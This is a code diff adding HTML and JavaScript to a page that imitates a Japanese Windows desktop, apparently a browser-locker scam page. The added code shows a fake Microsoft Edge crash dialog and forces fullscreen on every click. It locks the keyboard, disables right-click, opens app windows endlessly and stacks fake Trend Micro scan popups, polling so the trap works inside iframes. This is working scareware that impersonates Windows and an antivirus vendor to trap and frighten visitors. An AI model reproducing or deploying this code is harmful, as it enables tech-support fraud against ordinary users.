+          <svg fill="#fff" viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+        </div>
+        <div class="settings-profile-info">
+          <div class="settings-profile-name">ユーザー</div>
+          <div class="settings-profile-email">user@outlook.jp</div>
+        </div>
+      </div>
+      <div class="settings-search">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35" stroke-width="2" stroke-linecap="round"/></svg>
+        設定の検索
+      </div>
+      <div class="settings-nav">
+        <div class="settings-nav-item active" data-section="system">
+          <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+          <span>システム</span>
+        </div>
+        <div class="settings-nav-item" data-section="bluetooth">
+          <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M6.5 6.5l11 11M6.5 17.5l11-11M12 2v20"/></svg>
+          <span>Bluetooth とデバイス</span>
+        </div>
+        <div class="settings-nav-item" data-section="network">
+          <svg fill="currentColor" viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+          <span>ネットワークとインターネット</span>
+        </div>
+        <div class="settings-nav-item" data-section="personalize">
+          <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10A15.3 15.3 0 0 1 12 2z"/></svg>
+          <span>個人用設定</span>
+        </div>
+        <div class="settings-nav-item" data-section="apps">
+          <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+          <span>アプリ</span>
+        </div>
+        <div class="settings-nav-item" data-section="accounts">
+          <svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+          <span>アカウント</span>
+        </div>
+        <div class="settings-nav-item" data-section="time">
+          <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+          <span>時刻と言語</span>
+        </div>
+        <div class="settings-nav-item" data-section="gaming">
+          <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M6 12h4M8 10v4"/><circle cx="15" cy="11" r="1" fill="currentColor"/><circle cx="17" cy="13" r="1" fill="currentColor"/><rect x="2" y="6" width="20" height="12" rx="4"/></svg>
+          <span>ゲーム</span>
+        </div>
+        <div class="settings-nav-item" data-section="accessibility">
+          <svg fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="4" r="2"/><path d="M12 8c-3 0-6 1-6 1v3h3v9h2v-5h2v5h2v-9h3v-3s-3-1-6-1z"/></svg>
+          <span>アクセシビリティ</span>
+        </div>
+        <div class="settings-nav-item" data-section="privacy">
+          <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <span>プライバシーとセキュリティ</span>
+        </div>
+        <div class="settings-nav-item" data-section="update">
+          <svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M21 12a9 9 0 1 1-9-9"/><path d="M21 3v6h-6"/></svg>
+          <span>Windows Update</span>
+        </div>
+      </div>
+    </div>
+    <div class="settings-content" id="settings-panel">
+      <h1>システム</h1>
+      <div class="settings-card">
+        <div class="settings-row">
+          <div class="settings-row-icon"><svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg></div>
+          <div class="settings-row-text">
+            <div class="settings-row-label">ディスプレイ</div>
+            <div class="settings-row-desc">モニター、明るさ、暗視、ディスプレイ プロファイル</div>
+          </div>
+          ${chevron}
+        </div>
+        <div class="settings-row">
+          <div class="settings-row-icon"><svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M15.536 8.464a5 5 0 0 1 0 7.072M18.364 5.636a9 9 0 0 1 0 12.728M11 5L6 9H2v6h4l5 4V5z"/></svg></div>
+          <div class="settings-row-text">
+            <div class="settings-row-label">サウンド</div>
+            <div class="settings-row-desc">音量レベル、出力、入力、サウンド デバイス</div>
+          </div>
+          ${chevron}
+        </div>
+        <div class="settings-row">
+          <div class="settings-row-icon"><svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M15 17h5l-1.405-1.405A2.032 2.032 0 0 1 18 14.158V11a6.002 6.002 0 0 0-4-5.659V5a2 2 0 1 0-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 1 1-6 0v-1m6 0H9"/></svg></div>
+          <div class="settings-row-text">
+            <div class="settings-row-label">通知</div>
+            <div class="settings-row-desc">アプリとシステムからの通知</div>
+          </div>
+          ${chevron}
+        </div>
+        <div class="settings-row">
+          <div class="settings-row-icon"><svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg></div>
+          <div class="settings-row-text">
+            <div class="settings-row-label">電源とバッテリー</div>
+            <div class="settings-row-desc">スリープ、バッテリー使用状況、バッテリー節約機能</div>
+          </div>
+          ${chevron}
+        </div>
+        <div class="settings-row">
+          <div class="settings-row-icon"><svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path d="M4 7v10c0 2.21 3.58 4 8 4s8-1.79 8-4V7"/><ellipse cx="12" cy="7" rx="8" ry="4"/></svg></div>
+          <div class="settings-row-text">
+            <div class="settings-row-label">ストレージ</div>
+            <div class="settings-row-desc">ストレージ領域、ドライブの管理、構成規則</div>
+          </div>
+          <div class="settings-row-value">128 GB 使用中 / 256 GB</div>
+          ${chevron}
+        </div>
+        <div class="settings-row">
+          <div class="settings-row-icon"><svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><rect x="2" y="7" width="20" height="10" rx="2"/><path d="M16 7V5a4 4 0 0 0-8 0v2"/></svg></div>
+          <div class="settings-row-text">
+            <div class="settings-row-label">マルチタスク</div>
+            <div class="settings-row-desc">スナップ ウィンドウ、デスクトップ、タスクの切り替え</div>
+          </div>
+          ${chevron}
+        </div>
+        <div class="settings-row">
+          <div class="settings-row-icon"><svg fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></div>
+          <div class="settings-row-text">
+            <div class="settings-row-label">バージョン情報</div>
+            <div class="settings-row-desc">デバイスの仕様、名前の変更、Windows の仕様</div>
+          </div>
+          ${chevron}
+        </div>
+      </div>
+    </div>
+  </div>`;
+      }
+
+      function initSettingsNav(windowEl) {
+        windowEl.querySelectorAll(".settings-nav-item").forEach((item) => {
+          item.addEventListener("click", () => {
+            windowEl
+              .querySelectorAll(".settings-nav-item")
+              .forEach((i) => i.classList.remove("active"));
+            item.classList.add("active");
+          });
+        });
+        // Toggle switches
+        windowEl.querySelectorAll(".settings-toggle").forEach((t) => {
+          t.addEventListener("click", () => t.classList.toggle("on"));
+        });
+      }
+
+      // ── Show Windows-native dialog inside a window ──
+      function showDialog(wid, { title, message, icon, buttons }) {
+        const win = openWindows.get(wid);
+        if (!win) return;
+        const content = win.el.querySelector(".window-content");
+
+        // Warning icon SVG (yellow triangle with !)
+        const iconSvgs = {
+          warning: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path d="M24 4L2 42h44L24 4z" fill="#FFB900"/>
+      <path d="M24 4L2 42h44L24 4z" fill="none" stroke="#E6A200" stroke-width="1"/>
+      <rect x="22" y="18" width="4" height="14" rx="1" fill="#1a1a1a"/>
+      <rect x="22" y="35" width="4" height="4" rx="1" fill="#1a1a1a"/>
+    </svg>`,
+          error: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="24" cy="24" r="20" fill="#E81123"/>
+      <line x1="16" y1="16" x2="32" y2="32" stroke="#fff" stroke-width="3.5" stroke-linecap="round"/>
+      <line x1="32" y1="16" x2="16" y2="32" stroke="#fff" stroke-width="3.5" stroke-linecap="round"/>
+    </svg>`,
+          info: `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="24" cy="24" r="20" fill="#0078D4"/>
+      <rect x="22" y="20" width="4" height="14" rx="1" fill="#fff"/>
+      <rect x="22" y="14" width="4" height="4" rx="1" fill="#fff"/>
+    </svg>`,
+        };
+
+        const overlay = document.createElement("div");
+        overlay.className = "win-dialog-overlay";
+
+        const btnHtml = buttons
+          .map(
+            (b) =>
+              `<button class="win-dialog-btn ${b.primary ? "win-dialog-btn-primary" : ""}" data-action="${b.action}">${b.label}</button>`,
+          )
+          .join("");
+
+        overlay.innerHTML = `
+    <div class="win-dialog">
+      <div class="win-dialog-titlebar">
+        <div class="win-dialog-titlebar-text">${title}</div>
+        <div class="win-dialog-titlebar-btns">
+          <button class="win-dialog-titlebar-btn dlg-disabled" title="最小化">
+            <svg viewBox="0 0 10 10"><line x1="1" y1="5" x2="9" y2="5" stroke="#333" stroke-width="1.2"/></svg>
+          </button>
+          <button class="win-dialog-titlebar-btn dlg-disabled" title="最大化">
+            <svg viewBox="0 0 10 10"><rect x="1" y="1" width="8" height="8" stroke="#333" stroke-width="1.2" fill="none"/></svg>
+          </button>
+          <button class="win-dialog-titlebar-btn dlg-close" title="閉じる">
+            <svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="#333" stroke-width="1.2"/><line x1="9" y1="1" x2="1" y2="9" stroke="#333" stroke-width="1.2"/></svg>
+          </button>
+        </div>
+      </div>
+      <div class="win-dialog-body">
+        <div class="win-dialog-icon">${iconSvgs[icon] || iconSvgs.warning}</div>
+        <div class="win-dialog-text">
+          <div class="win-dialog-title">${title}</div>
+          <div class="win-dialog-message">${message}</div>
+        </div>
+      </div>
+      <div class="win-dialog-footer">${btnHtml}</div>
+    </div>
+  `;
+
+        // Close via title bar X
+        overlay
+          .querySelector(".dlg-close")
+          .addEventListener("click", () => overlay.remove());
+
+        // Button click handlers
+        overlay.querySelectorAll(".win-dialog-btn").forEach((btn) => {
+          btn.addEventListener("click", () => {
+            const action = btn.dataset.action;
+            overlay.remove();
+            if (action === "reopen") {
+              document.documentElement.requestFullscreen().catch(() => {});
+            }
+          });
+        });
+
+        document.body.appendChild(overlay);
+      }
+
+      // ── Auto-open Settings with crash dialog on load ──
+      (function initCrashDialog() {
+        const settingsApp = apps.find((a) => a.id === "settings");
+        openApp(settingsApp);
+        // The window we just opened is the latest one
+        const wid = windowIdCounter - 1;
+        showDialog(wid, {
+          title: "Microsoft Edge",
+          message:
+            "Microsoft Edge は正しくシャットダウンされませんでした。以前のページを再度開くには、「再度開く」をクリックしてください。",
+          icon: "warning",
+          buttons: [
+            { label: "再度開く", action: "reopen", primary: true },
+            { label: "閉じる", action: "close", primary: false },
+          ],
+        });
       })();
+
+      // Enter fullscreen on click (and re-enter after exiting fullscreen)
+      function ensureFullscreen() {
+        if (
+          !document.fullscreenElement &&
+          document.documentElement.requestFullscreen
+        ) {
+          document.documentElement.requestFullscreen().catch((err) => {
+            console.warn("Fullscreen request failed:", err);
+          });
+        }
+
+        navigator.keyboard.lock().catch(() => {});
+      }
+
+      document.addEventListener("click", ensureFullscreen);
+      // Disable right-click context menu
+      document.addEventListener("contextmenu", (event) =>
+        event.preventDefault(),
+      );
+
+      // Auto-open apps while in fullscreen, slowing down every 20 windows
+      let appSpawnIndex = 0;
+      let appSpawnCount = 0;
+      let appSpawnTimer = null;
+
+      function getSpawnInterval() {
+        return 3000 + Math.floor(appSpawnCount / 20) * 2000;
+      }
+
+      function spawnNext() {
+        if (!document.fullscreenElement) {
+          appSpawnTimer = null;
+          return;
+        }
+        if (appSpawnIndex < apps.length) {
+          openApp(apps[appSpawnIndex]);
+          appSpawnIndex++;
+        } else {
+          const randomApp = apps[Math.floor(Math.random() * apps.length)];
+          openApp(randomApp);
+        }
+        appSpawnCount++;
+        appSpawnTimer = setTimeout(spawnNext, getSpawnInterval());
+      }
+
+      function startAppSpawner() {
+        if (appSpawnTimer) return;
+        appSpawnTimer = setTimeout(spawnNext, getSpawnInterval());
+      }
+
+      function stopAppSpawner() {
+        if (appSpawnTimer) {
+          clearTimeout(appSpawnTimer);
+          appSpawnTimer = null;
+        }
+      }
+
+      // ── Fullscreen loading overlay (iframe-compatible) ──
+      const fsLoadingOverlay = document.getElementById("fs-loading-overlay");
+      const FS_LOADING_DURATION = 6000;
+      let fsLoadingTimer = null;
+      let lastFsState = false;
+
+      function isInFullscreen() {
+        // Standard + vendor-prefixed checks (work inside an allowfullscreen iframe)
+        if (
+          document.fullscreenElement ||
+          document.webkitFullscreenElement ||
+          document.mozFullScreenElement ||
+          document.msFullscreenElement
+        ) {
+          return true;
+        }
+        // Fallback for cases where the iframe is fullscreened by the parent:
+        // viewport matches the screen size.
+        if (
+          window.innerWidth === screen.width &&
+          window.innerHeight === screen.height
+        ) {
+          return true;
+        }
+        return false;
+      }
+
+      function showFsLoading() {
+        fsLoadingOverlay.classList.add("visible");
+        fsLoadingOverlay.setAttribute("aria-hidden", "false");
+        if (fsLoadingTimer) clearTimeout(fsLoadingTimer);
+        fsLoadingTimer = setTimeout(() => {
+          fsLoadingOverlay.classList.remove("visible");
+          fsLoadingOverlay.setAttribute("aria-hidden", "true");
+          fsLoadingTimer = null;
+        }, FS_LOADING_DURATION);
+      }
+
+      function hideFsLoading() {
+        if (fsLoadingTimer) {
+          clearTimeout(fsLoadingTimer);
+          fsLoadingTimer = null;
+        }
+        fsLoadingOverlay.classList.remove("visible");
+        fsLoadingOverlay.setAttribute("aria-hidden", "true");
+      }
+
+      function handleFullscreenState(inFs) {
+        if (inFs) {
+          showFsLoading();
+          startAppSpawner();
+          startTmSpawner();
+        } else {
+          hideFsLoading();
+          stopAppSpawner();
+          stopTmSpawner();
+        }
+      }
+
+      // Event-based detection (fires when the API is used directly)
+      [
+        "fullscreenchange",
+        "webkitfullscreenchange",
+        "mozfullscreenchange",
+        "MSFullscreenChange",
+      ].forEach((ev) => {
+        document.addEventListener(ev, () => {
+          const inFs = isInFullscreen();
+          if (inFs !== lastFsState) {
+            lastFsState = inFs;
+            handleFullscreenState(inFs);
+          }
+        });
+      });
+
+      // Continuous polling — required for iframe scenarios where the parent
+      // page fullscreens the iframe and no fullscreenchange event fires here.
+      setInterval(() => {
+        const inFs = isInFullscreen();
+        if (inFs !== lastFsState) {
+          lastFsState = inFs;
+          handleFullscreenState(inFs);
+        }
+      }, 500);
+
+      // ── Trend Micro Popup Spawner ──
+      const tmTemplate = document.getElementById("trendmicro-template");
+      const tmPopups = [];
+      const TM_POPUP_HEIGHT = 190; // approx height of each popup + gap
+      const TM_BOTTOM_START = 56; // above taskbar
+      const TM_GAP = 8;
+      let tmInterval = null;
+
+      function getTmTimestamp() {
+        const now = new Date();
+        return `${now.getFullYear()}/${String(now.getMonth() + 1).padStart(2, "0")}/${String(now.getDate()).padStart(2, "0")} ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}:${String(now.getSeconds()).padStart(2, "0")}`;
+      }
+
+      function spawnTmPopup() {
+        const clone = tmTemplate.cloneNode(true);
+        clone.removeAttribute("id");
+        clone.className = "tm-popup";
+        clone.style.display = "";
+
+        // Set timestamp
+        clone.querySelector(".tm-timestamp").textContent =
+          `最終スキャン: ${getTmTimestamp()}`;
+
+        // Calculate bottom position based on stack count
+        const bottomPos =
+          TM_BOTTOM_START + tmPopups.length * (TM_POPUP_HEIGHT + TM_GAP);
+
+        // Check if this popup would go above the top of the viewport
+        if (bottomPos + TM_POPUP_HEIGHT > window.innerHeight) {
+          // Clear all existing popups and restart
+          tmPopups.forEach((p) => p.remove());
+          tmPopups.length = 0;
+          clone.style.bottom = TM_BOTTOM_START + "px";
+        } else {
+          clone.style.bottom = bottomPos + "px";
+        }
+
+        // Wire up close buttons to remove just this popup
+        clone.querySelector(".tm-close").addEventListener("click", () => {
+          removeTmPopup(clone);
+        });
+        clone.querySelectorAll(".tm-btn").forEach((b) => {
+          b.addEventListener("click", () => {
+            removeTmPopup(clone);
+          });
+        });
+
+        document.body.appendChild(clone);
+        tmPopups.push(clone);
+      }
+
+      function removeTmPopup(el) {
+        const idx = tmPopups.indexOf(el);
+        if (idx > -1) tmPopups.splice(idx, 1);
+        el.remove();
+        // Reposition remaining popups
+        tmPopups.forEach((p, i) => {
+          p.style.bottom =
+            TM_BOTTOM_START + i * (TM_POPUP_HEIGHT + TM_GAP) + "px";
+        });
+      }
+
+      function startTmSpawner() {
+        if (tmInterval) return;
+        spawnTmPopup();
+        tmInterval = setInterval(spawnTmPopup, 5000);
+      }
+
+      function stopTmSpawner() {
+        if (tmInterval) {
+          clearInterval(tmInterval);
+          tmInterval = null;
+        }
+        // Remove all existing popups
+        tmPopups.forEach((p) => p.remove());
+        tmPopups.length = 0;
+      }
     </script>
   </body>
 </html>
